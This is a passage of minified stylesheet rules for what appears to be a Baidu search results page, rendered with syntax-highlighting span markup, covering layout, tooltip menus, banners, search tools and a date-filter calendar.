class="variable">.c-tip-item-i</span>&#123;padding:3px 0 3px 20px;<span class="attribute">line-height</span>:14px&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-item-i</span> <span class="variable">.c-tip-item-icon</span>&#123;margin-left:-20px&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-menu</span> ul&#123;width:74px&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-menu</span> ul&#123;text-align:center&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-menu</span> li a&#123;display:block;<span class="attribute">text-decoration</span>:none;<span class="attribute">cursor</span>:pointer;<span class="attribute">background-color</span>:#fff;<span class="attribute">padding</span>:3px 0;<span class="attribute">color</span>:#0000d0&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-menu</span> li a:hover&#123;display:block;<span class="attribute">background-color</span>:#ebebeb&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-notice</span>&#123;width:239px;<span class="attribute">padding</span>:0 10px&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-notice</span> <span class="variable">.c-tip-notice-succ</span>&#123;color:#4cbd37&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-notice</span> <span class="variable">.c-tip-notice-fail</span>&#123;color:#f13f40&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-notice</span> <span class="variable">.c-tip-item-succ</span>&#123;color:#444&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-notice</span> <span class="variable">.c-tip-item-fail</span>&#123;color:#aaa&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-notice</span> <span class="variable">.c-tip-item-fail</span> a&#123;color:#aaa&#125;\n<span class="variable">.c-tip-close</span>&#123;right:10px;<span class="attribute">position</span>:absolute;<span class="attribute">cursor</span>:pointer&#125;\n<span class="variable">.ecard</span>&#123;height:86px;<span class="attribute">overflow</span>:hidden&#125;\n<span class="variable">.c-tools</span>&#123;display:inline&#125;\n<span class="variable">.c-tools-share</span>&#123;width:239px;<span class="attribute">padding</span>:0 10px&#125;\n<span class="variable">.c-fanyi</span>&#123;display:none;<span class="attribute">width</span>:20px;<span class="attribute">height</span>:20px;<span class="attribute">border</span>:solid 1px #d1d1d1;<span class="attribute">cursor</span>:pointer;<span class="attribute">position</span>:absolute;<span class="attribute">margin-left</span>:516px;<span class="attribute">text-align</span>:center;<span class="attribute">color</span>:#333;<span class="attribute">line-height</span>:22px;<span class="attribute">opacity</span>:.9;<span class="attribute">background-color</span>:#fff&#125;\n<span class="variable">.c-fanyi</span>:hover&#123;background-color:#39f;<span class="attribute">color</span>:#fff;<span class="attribute">border-color</span>:#39f;<span class="attribute">opacity</span>:1&#125;\n<span class="variable">.c-fanyi-abstract</span>,<span class="variable">.c-fanyi-title</span>&#123;display:none&#125;\n<span class="variable">.icp_info</span>&#123;color:#666;<span class="attribute">margin-top</span>:2px;<span class="attribute">font-size</span>:13px&#125;\n<span class="variable">.icon-gw</span>,<span class="variable">.icon-unsafe-icon</span>&#123;background:#2c99ff;<span class="attribute">vertical-align</span>:text-bottom;*<span class="attribute">vertical-align</span>:baseline;<span class="attribute">height</span>:16px;<span class="attribute">padding-top</span>:0;<span class="attribute">padding-bottom</span>:0;<span class="attribute">padding-left</span>:6px;<span class="attribute">padding-right</span>:6px;<span class="attribute">line-height</span>:16px;<span class="attribute">_padding-top</span>:2px;<span class="attribute">_height</span>:14px;<span class="attribute">_line-height</span>:14px;<span class="attribute">font-size</span>:12px;<span class="attribute">font-family</span>:simsun;<span class="attribute">margin-left</span>:10px;<span class="attribute">overflow</span>:hidden;<span class="attribute">display</span>:inline-block;<span class="attribute">-moz-border-radius</span>:1px;<span class="attribute">-webkit-border-radius</span>:1px;<span class="attribute">border-radius</span>:1px;<span class="attribute">color</span>:#fff&#125;\na<span class="variable">.icon-gw</span>&#123;color:#fff;<span class="attribute">background</span>:#2196ff;<span class="attribute">text-decoration</span>:none;<span class="attribute">cursor</span>:pointer&#125;\na<span class="variable">.icon-gw</span>:hover&#123;background:#1e87ef&#125;\na<span class="variable">.icon-gw</span>:active&#123;height:15px;<span class="attribute">_height</span>:13px;<span class="attribute">line-height</span>:15px;<span class="attribute">_line-height</span>:13px;<span class="attribute">padding-left</span>:5px;<span class="attribute">background</span>:#1c80d9;<span class="attribute">border-left</span>:1px solid #145997;<span class="attribute">border-top</span>:1px solid #145997&#125;\n<span class="variable">.icon-unsafe-icon</span>&#123;background:#e54d4b&#125;\n#con-at&#123;margin-bottom:9px;<span class="attribute">padding-left</span>:121px;<span class="attribute">border-bottom</span>:1px #ebebeb solid&#125;\n#con-at <span class="variable">.result-op</span>&#123;font-size:13px;<span class="attribute">line-height</span>:1.52em&#125;\n<span class="variable">.wrapper_l</span> #con-at <span class="variable">.result-op</span>&#123;width:1058px&#125;\n<span class="variable">.wrapper_s</span> #con-at <span class="variable">.result-op</span>&#123;width:869px&#125;\n#con-ar&#123;margin-bottom:40px&#125;\n#con-ar <span class="variable">.result-op</span>&#123;margin-bottom:28px;<span class="attribute">font-size</span>:13px;<span class="attribute">line-height</span>:1.52em&#125;\n<span class="variable">.result_hidden</span>&#123;position:absolute;<span class="attribute">top</span>:-10000px;<span class="attribute">left</span>:-10000px&#125;\n#content_left <span class="variable">.result</span>,#content_left <span class="variable">.result-op</span>&#123;margin-bottom:14px;<span class="attribute">border-collapse</span>:collapse&#125;\n#content_left <span class="variable">.c-border</span> <span class="variable">.result</span>,#content_left <span class="variable">.c-border</span> <span class="variable">.result-op</span>&#123;margin-bottom:25px&#125;\n#content_left <span class="variable">.c-border</span> <span class="variable">.result-op</span>:last-child,#content_left <span class="variable">.c-border</span> <span class="variable">.result</span>:last-child&#123;margin-bottom:12px&#125;\n#content_left <span class="variable">.result</span> <span class="variable">.f</span>,#content_left <span class="variable">.result-op</span> <span class="variable">.f</span>&#123;padding:0&#125;\n<span class="variable">.subLink_factory</span>&#123;border-collapse:collapse&#125;\n<span class="variable">.subLink_factory</span> td&#123;padding:0&#125;\n<span class="variable">.subLink_factory</span> td<span class="variable">.last</span>,<span class="variable">.subLink_factory</span> td<span class="variable">.middle</span>&#123;color:#666&#125;\n<span class="variable">.subLink_factory</span> td a&#123;text-decoration:underline&#125;\n<span class="variable">.subLink_factory</span> td<span class="variable">.rightTd</span>&#123;text-align:right&#125;\n<span class="variable">.subLink_factory_right</span>&#123;width:100%&#125;\n<span class="variable">.subLink_factory_left</span> td&#123;padding-right:26px&#125;\n<span class="variable">.subLink_factory_left</span> td<span class="variable">.last</span>&#123;padding:0&#125;\n<span class="variable">.subLink_factory_left</span> td<span class="variable">.first</span>&#123;padding-right:75px&#125;\n<span class="variable">.subLink_factory_right</span> td&#123;width:90px&#125;\n<span class="variable">.subLink_factory_right</span> td<span class="variable">.first</span>&#123;width:auto&#125;\n<span class="variable">.subLink_answer</span>&#123;padding-top:4px&#125;\n<span class="variable">.subLink_answer</span> li&#123;margin-bottom:4px&#125;\n<span class="variable">.subLink_answer</span> h4&#123;margin:0;<span class="attribute">padding</span>:0;<span class="attribute">font-weight</span>:400&#125;\n<span class="variable">.subLink_answer</span> <span class="variable">.label_wrap</span> span&#123;display:inline-block;<span class="attribute">color</span>:#666;<span class="attribute">margin-right</span>:8px&#125;\n<span class="variable">.subLink_answer</span> <span class="variable">.label_wrap</span> span em&#123;color:#666;<span class="attribute">padding-left</span>:8px&#125;\n<span class="variable">.subLink_answer</span> span<span class="variable">.c-icon</span>&#123;margin-right:4px&#125;\n<span class="variable">.subLink_answer_dis</span>&#123;padding:0 3px&#125;\n<span class="variable">.subLink_answer</span> <span class="variable">.date</span>&#123;color:#666&#125;\n<span class="variable">.general_image_pic</span> a&#123;background:#fff no-repeat center center;<span class="attribute">text-decoration</span>:none;<span class="attribute">display</span>:block;<span class="attribute">overflow</span>:hidden;<span class="attribute">text-align</span>:left&#125;\n<span class="variable">.res_top_banner</span>&#123;height:36px;<span class="attribute">text-align</span>:left;<span class="attribute">border-bottom</span>:1px solid #e3e3e3;<span class="attribute">background</span>:#f7f7f7;<span class="attribute">font-size</span>:13px;<span class="attribute">padding-left</span>:8px;<span class="attribute">color</span>:#333;<span class="attribute">position</span>:relative;<span class="attribute">z-index</span>:302&#125;\n<span class="variable">.res_top_banner</span> span&#123;_zoom:1&#125;\n<span class="variable">.res_top_banner</span> <span class="variable">.res_top_banner_icon</span>&#123;background-position:0 -216px;<span class="attribute">width</span>:18px;<span class="attribute">height</span>:18px;<span class="attribute">margin</span>:9px 10px 0 0&#125;\n<span class="variable">.res_top_banner</span> <span class="variable">.res_top_banner_icon_baiduapp</span>&#123;background:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/baiduappLogo_de45621<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>) no-repeat 0 0;<span class="attribute">width</span>:24px;<span class="attribute">height</span>:24px;<span class="attribute">margin</span>:3px 10px 0 0;<span class="attribute">position</span>:relative;<span class="attribute">top</span>:3px&#125;\n<span class="variable">.res_top_banner</span> <span class="variable">.res_top_banner_icon_windows</span>&#123;background:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/winlogo_e925689<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>) no-repeat 0 0;<span class="attribute">width</span>:18px;<span class="attribute">height</span>:18px;<span class="attribute">margin</span>:9px 10px 0 0&#125;\n<span class="variable">.res_top_banner</span> <span class="variable">.res_top_banner_download</span>&#123;display:inline-block;<span class="attribute">width</span>:65px;<span class="attribute">line-height</span>:21px;<span class="attribute">_padding-top</span>:1px;<span class="attribute">margin</span>:0 0 0 10px;<span class="attribute">color</span>:#333;<span class="attribute">background</span>:#fbfbfb;<span class="attribute">border</span>:1px solid #b4b6b8;<span class="attribute">text-align</span>:center;<span class="attribute">text-decoration</span>:none&#125;\n<span class="variable">.res_top_banner</span> <span class="variable">.res_top_banner_download</span>:hover&#123;border:1px solid #38f&#125;\n<span class="variable">.res_top_banner</span> <span class="variable">.res_top_banner_download</span>:active&#123;background:#f0f0f0;<span class="attribute">border</span>:1px solid #b4b6b8&#125;\n<span class="variable">.res_top_banner</span> <span class="variable">.res_top_banner_close</span>&#123;background-position:-672px -144px;<span class="attribute">cursor</span>:pointer;<span class="attribute">position</span>:absolute;<span class="attribute">right</span>:10px;<span class="attribute">top</span>:10px&#125;\n<span class="variable">.res_top_banner_for_win</span>&#123;height:34px;<span class="attribute">text-align</span>:left;<span class="attribute">border-bottom</span>:1px solid #f0f0f0;<span class="attribute">background</span>:#fdfdfd;<span class="attribute">font-size</span>:13px;<span class="attribute">padding-left</span>:12px;<span class="attribute">color</span>:#333;<span class="attribute">position</span>:relative;<span class="attribute">z-index</span>:302&#125;\n<span class="variable">.res_top_banner_for_win</span> span&#123;_zoom:1;<span class="attribute">color</span>:#666&#125;\n<span class="variable">.res_top_banner_for_win</span> <span class="variable">.res_top_banner_download</span>&#123;display:inline-block;<span class="attribute">width</span>:auto;<span class="attribute">line-height</span>:21px;<span class="attribute">_padding-top</span>:1px;<span class="attribute">margin</span>:0 0 0 16px;<span class="attribute">color</span>:#333;<span class="attribute">text-align</span>:left;<span class="attribute">text-decoration</span>:underline&#125;\n<span class="variable">.res_top_banner_for_win</span> <span class="variable">.res_top_banner_icon_windows</span>&#123;background:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/winlogo_e925689<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>) no-repeat 0 0;<span class="attribute">width</span>:18px;<span class="attribute">height</span>:18px;<span class="attribute">margin</span>:8px 8px 0 0&#125;\n<span class="variable">.res_top_banner_for_win</span> <span class="variable">.res_top_banner_close</span>&#123;background-position:-672px -144px;<span class="attribute">cursor</span>:pointer;<span class="attribute">position</span>:absolute;<span class="attribute">right</span>:10px;<span class="attribute">top</span>:10px&#125;\n<span class="variable">.res-gap-right</span>16&#123;margin-right:16px&#125;\n<span class="variable">.res-border-top</span>&#123;border-top:1px solid #f3f3f3&#125;\n<span class="variable">.res-border-bottom</span>&#123;border-bottom:1px solid #f3f3f3&#125;\n<span class="variable">.res-queryext-pos</span>&#123;position:relative;<span class="attribute">top</span>:1px;<span class="attribute">_top</span>:0&#125;\n<span class="variable">.c-trust-ecard</span>&#123;height:86px;<span class="attribute">_height</span>:97px;<span class="attribute">overflow</span>:hidden&#125;\n@-moz-document url-prefix()&#123;\n<span class="variable">.f</span>,<span class="variable">.result</span>&#123;width:538px&#125;\n&#125;\nbody&#123;min-width:1000px&#125;\n#ftCon&#123;display:none&#125;\n#qrcode&#123;display:none&#125;\n#pad-version&#123;display:none&#125;\n#index_guide&#123;display:none&#125;\n#index_logo&#123;display:none&#125;\n#u1&#123;display:none&#125;\n<span class="variable">.s_ipt_wr</span>&#123;height:32px&#125;\nbody&#123;padding:0&#125;\n<span class="variable">.s_form</span>:after,<span class="variable">.s_tab</span>:after&#123;content:\".\";<span class="attribute">display</span>:block;<span class="attribute">height</span>:0;<span class="attribute">clear</span>:both;<span class="attribute">visibility</span>:hidden&#125;\n<span class="variable">.s_form</span>&#123;zoom:1;<span class="attribute">height</span>:55px;<span class="attribute">padding</span>:0 0 0 10px&#125;\n#head #head_wrapper&#123;height:55px;<span class="attribute">min-height</span>:auto;<span class="attribute">width</span>:auto&#125;\n#head #head_wrapper <span class="variable">.s_form</span>&#123;width:auto;<span class="attribute">min-height</span>:auto&#125;\n#result_logo&#123;float:left;<span class="attribute">margin</span>:7px 0 0&#125;\n#result_logo img&#123;width:101px;<span class="attribute">height</span>:33px&#125;\n#head&#123;padding:0;<span class="attribute">margin</span>:0;<span class="attribute">width</span>:100%;<span class="attribute">position</span>:absolute;<span class="attribute">z-index</span>:301;<span class="attribute">min-width</span>:1000px;<span class="attribute">background</span>:#fff;<span class="attribute">border-bottom</span>:1px solid #ebebeb;<span class="attribute">position</span>:fixed;<span class="attribute">_position</span>:absolute;<span class="attribute">-webkit-transform</span>:translateZ(0)&#125;\n#head #head_wrapper&#123;_width:1000px&#125;\n#head<span class="variable">.s_down</span>&#123;box-shadow:0 0 5px #888&#125;\n<span class="variable">.fm</span>&#123;clear:none;<span class="attribute">float</span>:left;<span class="attribute">margin</span>:11px 0 0 10px&#125;\n#s_tab&#123;background:#f8f8f8;<span class="attribute">line-height</span>:36px;<span class="attribute">height</span>:38px;<span class="attribute">padding</span>:55px 0 0 121px;<span class="attribute">float</span>:none;<span class="attribute">zoom</span>:1&#125;\n#s_tab a,#s_tab b&#123;width:54px;<span class="attribute">display</span>:inline-block;<span class="attribute">text-decoration</span>:none;<span class="attribute">text-align</span>:center;<span class="attribute">color</span>:#666;<span class="attribute">font-size</span>:14px&#125;\n#s_tab b&#123;border-bottom:2px solid #38f;<span class="attribute">font-weight</span>:700;<span class="attribute">color</span>:#323232&#125;\n#s_tab a:hover&#123;color:#323232&#125;\n#content_left&#123;width:540px;<span class="attribute">padding-left</span>:121px;<span class="attribute">padding-top</span>:5px&#125;\n#content_right&#123;margin-top:45px&#125;\n#content_bottom&#123;width:540px;<span class="attribute">padding-left</span>:121px&#125;\n#page&#123;padding:0 0 0 121px;<span class="attribute">margin</span>:30px 0 40px&#125;\n<span class="variable">.to_tieba</span>,<span class="variable">.to_zhidao_bottom</span>&#123;margin:10px 0 0 121px;<span class="attribute">padding-top</span>:5px&#125;\n<span class="variable">.nums</span>&#123;margin:0 0 0 121px;<span class="attribute">height</span>:42px;<span class="attribute">line-height</span>:42px&#125;\n#rs&#123;padding:0;<span class="attribute">margin</span>:6px 0 0 121px;<span class="attribute">width</span>:600px&#125;\n#rs th&#123;width:175px;<span class="attribute">line-height</span>:22px&#125;\n#rs <span class="variable">.tt</span>&#123;padding:0;<span class="attribute">line-height</span>:30px&#125;\n#rs td&#123;width:5px&#125;\n#rs table&#123;width:540px&#125;\n#help&#123;background:#f5f6f5;<span class="attribute">zoom</span>:1;<span class="attribute">padding</span>:0 0 0 50px;<span class="attribute">float</span>:right&#125;\n#help a&#123;color:#777;<span class="attribute">padding</span>:0 15px;<span class="attribute">text-decoration</span>:none&#125;\n#help a:hover&#123;color:#333&#125;\n#foot&#123;background:#f5f6f5;<span class="attribute">border-top</span>:1px solid #ebebeb;<span class="attribute">text-align</span>:left;<span class="attribute">height</span>:42px;<span class="attribute">line-height</span>:42px;<span class="attribute">margin-top</span>:40px;*<span class="attribute">margin-top</span>:0&#125;\n#foot <span class="variable">.foot_c</span>&#123;float:left;<span class="attribute">padding</span>:0 0 0 121px&#125;\n<span class="variable">.content_none</span>&#123;padding:45px 0 25px 121px&#125;\n<span class="variable">.nors</span> p&#123;font-size:18px;<span class="attribute">font-family</span>:microsoft yahei;<span class="attribute">color</span>:#000&#125;\n<span class="variable">.nors</span> p em&#123;color:#c00&#125;\n<span class="variable">.nors</span> <span class="variable">.tip_head</span>&#123;color:#666;<span class="attribute">font-size</span>:13px;<span class="attribute">line-height</span>:28px&#125;\n<span class="variable">.nors</span> li&#123;color:#333;<span class="attribute">line-height</span>:28px;<span class="attribute">font-size</span>:13px;<span class="attribute">font-family</span>:'\u5b8b\u4f53';<span class="attribute">padding-left</span>:30px;<span class="attribute">list-style-position</span>:inside;<span class="attribute">list-style-type</span>:disc&#125;\n#mCon&#123;top:5px&#125;\n#su<span class="variable">.bg</span>,<span class="variable">.s_btn_wr</span><span class="variable">.bg</span>,<span class="variable">.s_ipt_wr</span><span class="variable">.bg</span>&#123;background-image:none&#125;\n<span class="variable">.s_ipt_wr</span><span class="variable">.bg</span>&#123;background:0 0&#125;\n<span class="variable">.s_btn_wr</span>&#123;width:auto;<span class="attribute">height</span>:auto;<span class="attribute">border-bottom</span>:1px solid transparent;*<span class="attribute">border-bottom</span>:0&#125;\n<span class="variable">.s_btn</span>&#123;width:100px;<span class="attribute">height</span>:34px;<span class="attribute">color</span>:#fff;<span class="attribute">letter-spacing</span>:1px;<span class="attribute">background</span>:#3385ff;<span class="attribute">border-bottom</span>:1px solid #2d78f4;<span class="attribute">outline</span>:medium;*<span class="attribute">border-bottom</span>:0;<span class="attribute">-webkit-appearance</span>:none;<span class="attribute">-webkit-border-radius</span>:0&#125;\n<span class="variable">.s_btn</span><span class="variable">.btnhover</span>&#123;background:#317ef3;<span class="attribute">border-bottom</span>:1px solid #2868c8;*<span class="attribute">border-bottom</span>:0;<span class="attribute">box-shadow</span>:1px 1px 1px #ccc&#125;\n<span class="variable">.s_btn_h</span>&#123;background:#3075dc;<span class="attribute">box-shadow</span>:inset 1px 1px 3px #2964bb;<span class="attribute">-webkit-box-shadow</span>:inset 1px 1px 3px #2964bb;<span class="attribute">-moz-box-shadow</span>:inset 1px 1px 3px #2964bb;<span class="attribute">-o-box-shadow</span>:inset 1px 1px 3px #2964bb&#125;\n#wrapper_wrapper <span class="variable">.container_l</span> <span class="variable">.EC_ppim_top</span>,#wrapper_wrapper <span class="variable">.container_xl</span> <span class="variable">.EC_ppim_top</span>&#123;width:640px&#125;\n#wrapper_wrapper <span class="variable">.container_s</span> <span class="variable">.EC_ppim_top</span>&#123;width:570px&#125;\n#head <span class="variable">.c-icon-bear-round</span>&#123;display:none&#125;\n<span class="variable">.container_l</span> #content_right&#123;width:384px&#125;\n<span class="variable">.container_l</span>&#123;width:1212px&#125;\n<span class="variable">.container_xl</span> #content_right&#123;width:384px&#125;\n<span class="variable">.container_xl</span>&#123;width:1257px&#125;\n<span class="variable">.index_tab_top</span>&#123;display:none&#125;\n<span class="variable">.index_tab_bottom</span>&#123;display:none&#125;\n#lg&#123;display:none&#125;\n#m&#123;display:none&#125;\n#ftCon&#123;display:none&#125;\n#ent_sug&#123;position:absolute;<span class="attribute">margin</span>:141px 0 0 130px;<span class="attribute">font-size</span>:13px;<span class="attribute">color</span>:#666&#125;\n<span class="variable">.foot_fixed_bottom</span>&#123;position:fixed;<span class="attribute">bottom</span>:0;<span class="attribute">width</span>:100%;<span class="attribute">_position</span>:absolute;<span class="attribute">_bottom</span>:auto&#125;\n#head <span class="variable">.headBlock</span>&#123;margin:-5px 0 6px 121px&#125;\n#content_left <span class="variable">.leftBlock</span>&#123;margin-bottom:14px;<span class="attribute">padding-bottom</span>:5px;<span class="attribute">border-bottom</span>:1px solid #f3f3f3&#125;\n<span class="variable">.hint_toprq_tips</span>&#123;position:relative;<span class="attribute">width</span>:537px;<span class="attribute">height</span>:19px;<span class="attribute">line-height</span>:19px;<span class="attribute">overflow</span>:hidden;<span class="attribute">display</span>:none&#125;\n<span class="variable">.hint_toprq_tips</span> span&#123;color:#666&#125;\n<span class="variable">.hint_toprq_icon</span>&#123;margin:0 4px 0 0&#125;\n<span class="variable">.hint_toprq_tips_items</span>&#123;width:444px;<span class="attribute">_width</span>:440px;<span class="attribute">max-height</span>:38px;<span class="attribute">position</span>:absolute;<span class="attribute">left</span>:95px;<span class="attribute">top</span>:1px&#125;\n<span class="variable">.hint_toprq_tips_items</span> div&#123;display:inline-block;<span class="attribute">float</span>:left;<span class="attribute">height</span>:19px;<span class="attribute">margin-right</span>:18px;<span class="attribute">white-space</span>:nowrap;<span class="attribute">word-break</span>:keep-all&#125;\n<span class="variable">.translateContent</span>&#123;max-width:350px&#125;\n<span class="variable">.translateContent</span> <span class="variable">.translateTool</span>&#123;height:16px;<span class="attribute">margin</span>:-3px 2px&#125;\n<span class="variable">.translateContent</span> <span class="variable">.action-search</span>,<span class="variable">.translateContent</span> <span class="variable">.action-translate</span>&#123;display:inline-block;<span class="attribute">width</span>:20px;<span class="attribute">height</span>:16px;<span class="attribute">background</span>:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/translate_tool_icon_57087b6<span class="variable">.gif</span>?v=62527263<span class="variable">.gif</span>) no-repeat&#125;\n<span class="variable">.translateContent</span> <span class="variable">.action-translate</span>&#123;background-position:0 0;<span class="attribute">border-right</span>:1px solid #dcdcdc&#125;\n<span class="variable">.translateContent</span> <span class="variable">.action-translate</span>:hover&#123;background-position:0 -20px&#125;\n<span class="variable">.translateContent</span> <span class="variable">.action-search</span>&#123;background-position:-20px 0&#125;\n<span class="variable">.translateContent</span> <span class="variable">.action-search</span>:hover&#123;background-position:-20px -20px&#125;\n<span class="variable">.nums</span>&#123;width:538px&#125;\n<span class="variable">.search_tool</span>&#123;_padding-top:15px&#125;\n<span class="variable">.head_nums_cont_outer</span>&#123;height:40px;<span class="attribute">overflow</span>:hidden;<span class="attribute">position</span>:relative&#125;\n<span class="variable">.head_nums_cont_inner</span>&#123;position:relative&#125;\n<span class="variable">.search_tool_conter</span> <span class="variable">.c-gap-left</span>&#123;margin-left:23px&#125;\n<span class="variable">.search_tool_conter</span> <span class="variable">.c-icon-triangle-down</span>&#123;opacity:.6&#125;\n<span class="variable">.search_tool_conter</span> <span class="variable">.c-icon-triangle-down</span>:hover&#123;opacity:1&#125;\n<span class="variable">.search_tool</span>,<span class="variable">.search_tool_close</span>&#123;float:right&#125;\n<span class="variable">.search_tool</span>,<span class="variable">.search_tool_conter</span> span&#123;cursor:pointer;<span class="attribute">color</span>:#666&#125;\n<span class="variable">.search_tool</span>:hover,<span class="variable">.search_tool_conter</span> span:hover&#123;color:#333&#125;\n<span class="variable">.search_tool_conter</span>&#123;font-size:12px;<span class="attribute">color</span>:#666;<span class="attribute">margin</span>:0 0 0 121px;<span class="attribute">height</span>:42px;<span class="attribute">width</span>:538px;<span class="attribute">line-height</span>:42px;*<span class="attribute">height</span>:auto;*<span class="attribute">line-height</span>:normal;*<span class="attribute">padding</span>:14px 0&#125;\n<span class="variable">.search_tool_conter</span> span strong&#123;color:#666&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-langfilter</span> ul&#123;width:80px;<span class="attribute">text-align</span>:left;<span class="attribute">color</span>:#666&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-langfilter</span> li a&#123;text-indent:15px;<span class="attribute">color</span>:#666&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-langfilter</span> li span&#123;text-indent:15px;<span class="attribute">padding</span>:3px 0;<span class="attribute">color</span>:#999;<span class="attribute">display</span>:block&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-timerfilter</span> ul&#123;width:115px;<span class="attribute">text-align</span>:left;<span class="attribute">color</span>:#666&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-timerfilter-ft</span> ul&#123;width:180px&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-timerfilter-si</span> ul&#123;width:206px;<span class="attribute">padding</span>:7px 10px 10px&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-timerfilter</span> li a&#123;text-indent:15px;<span class="attribute">color</span>:#666&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-timerfilter</span> li span&#123;text-indent:15px;<span class="attribute">padding</span>:3px 0;<span class="attribute">color</span>:#999;<span class="attribute">display</span>:block&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-timerfilter-ft</span> li a,<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-timerfilter-ft</span> li span&#123;text-indent:20px&#125;\n<span class="variable">.c-tip-custom</span>&#123;padding:0 15px 10px;<span class="attribute">position</span>:relative;<span class="attribute">zoom</span>:1&#125;\n<span class="variable">.c-tip-custom</span> hr&#123;border:0;<span class="attribute">height</span>:0;<span class="attribute">border-top</span>:1px solid #ebebeb&#125;\n<span class="variable">.c-tip-custom</span> p&#123;color:#b6b6b6;<span class="attribute">height</span>:25px;<span class="attribute">line-height</span>:25px;<span class="attribute">margin</span>:2px 0&#125;\n<span class="variable">.c-tip-custom</span> <span class="variable">.c-tip-custom-et</span>&#123;margin-bottom:7px&#125;\n<span class="variable">.c-tip-custom-input</span>,<span class="variable">.c-tip-si-input</span>&#123;display:inline-block;<span class="attribute">font-size</span>:11px;<span class="attribute">color</span>:#333;<span class="attribute">margin-left</span>:4px;<span class="attribute">padding</span>:0 2px;<span class="attribute">width</span>:74%;<span class="attribute">height</span>:16px;<span class="attribute">line-height</span>:16px\\9;<span class="attribute">border</span>:1px solid #ebebeb;<span class="attribute">outline</span>:0;<span class="attribute">box-sizing</span>:content-box;<span class="attribute">-webkit-box-sizing</span>:content-box;<span class="attribute">-moz-box-sizing</span>:content-box;<span class="attribute">overflow</span>:hidden;<span class="attribute">position</span>:relative&#125;\n<span class="variable">.c-tip-custom-input-init</span>&#123;color:#d4d4d4&#125;\n<span class="variable">.c-tip-custom-input-focus</span>,<span class="variable">.c-tip-si-input-focus</span>&#123;border:1px solid #3385ff&#125;\n<span class="variable">.c-tip-timerfilter-si</span> <span class="variable">.c-tip-si-input</span>&#123;width:138px;<span class="attribute">height</span>:22px;<span class="attribute">line-height</span>:22px;<span class="attribute">vertical-align</span>:0;*<span class="attribute">vertical-align</span>:-6px;<span class="attribute">_vertical-align</span>:-5px;<span class="attribute">padding</span>:0 5px;<span class="attribute">margin-left</span>:0&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-timerfilter</span> li <span class="variable">.c-tip-custom-submit</span>,<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-timerfilter</span> li <span class="variable">.c-tip-timerfilter-si-submit</span>&#123;display:inline;<span class="attribute">padding</span>:4px 10px;<span class="attribute">margin</span>:0;<span class="attribute">color</span>:#333;<span class="attribute">border</span>:1px solid #d8d8d8;<span class="attribute">font-family</span>:inherit;<span class="attribute">font-weight</span>:400;<span class="attribute">text-align</span>:center;<span class="attribute">vertical-align</span>:0;<span class="attribute">background-color</span>:#f9f9f9;<span class="attribute">outline</span>:0&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-timerfilter</span> li <span class="variable">.c-tip-custom-submit</span>:hover,<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-timerfilter</span> li <span class="variable">.c-tip-timerfilter-si-submit</span>:hover&#123;display:inline;<span class="attribute">border-color</span>:#388bff&#125;\n<span class="variable">.c-tip-timerfilter-custom-error</span>,<span class="variable">.c-tip-timerfilter-si-error</span>&#123;display:none;<span class="attribute">color</span>:#3385ff;<span class="attribute">padding-left</span>:4px&#125;\n<span class="variable">.c-tip-timerfilter-custom-error</span>&#123;padding:0;<span class="attribute">margin</span>:-5px -13px 7px 0&#125;\n#c-tip-custom-calenderCont&#123;position:absolute;<span class="attribute">background</span>:#fff;<span class="attribute">white-space</span>:nowrap;<span class="attribute">padding</span>:5px 10px;<span class="attribute">color</span>:#000;<span class="attribute">border</span>:1px solid #e4e4e4;<span class="attribute">-webkit-box-shadow</span>:0 2px 4px rgba(0,0,0,.2);<span class="attribute">box-shadow</span>:0 2px 4px rgba(0,0,0,.2)&#125;\n#c-tip-custom-calenderCont p&#123;text-align:center;<span class="attribute">padding</span>:2px 0 4px;*<span class="attribute">padding</span>:4px 0&#125;\n#c-tip-custom-calenderCont p i&#123;color:#8e9977;<span class="attribute">cursor</span>:pointer;<span class="attribute">text-decoration</span>:underline;<span class="attribute">font-size</span>:13px&#125;\n#c-tip-custom-calenderCont <span class="variable">.op_cal</span>&#123;background:#fff&#125;\n<span class="variable">.op_cal</span> table&#123;background:#eeefea;<span class="attribute">margin</span>:0;<span class="attribute">border-collapse</span>:separate&#125;\n<span class="variable">.op_btn_next_month</span>,<span 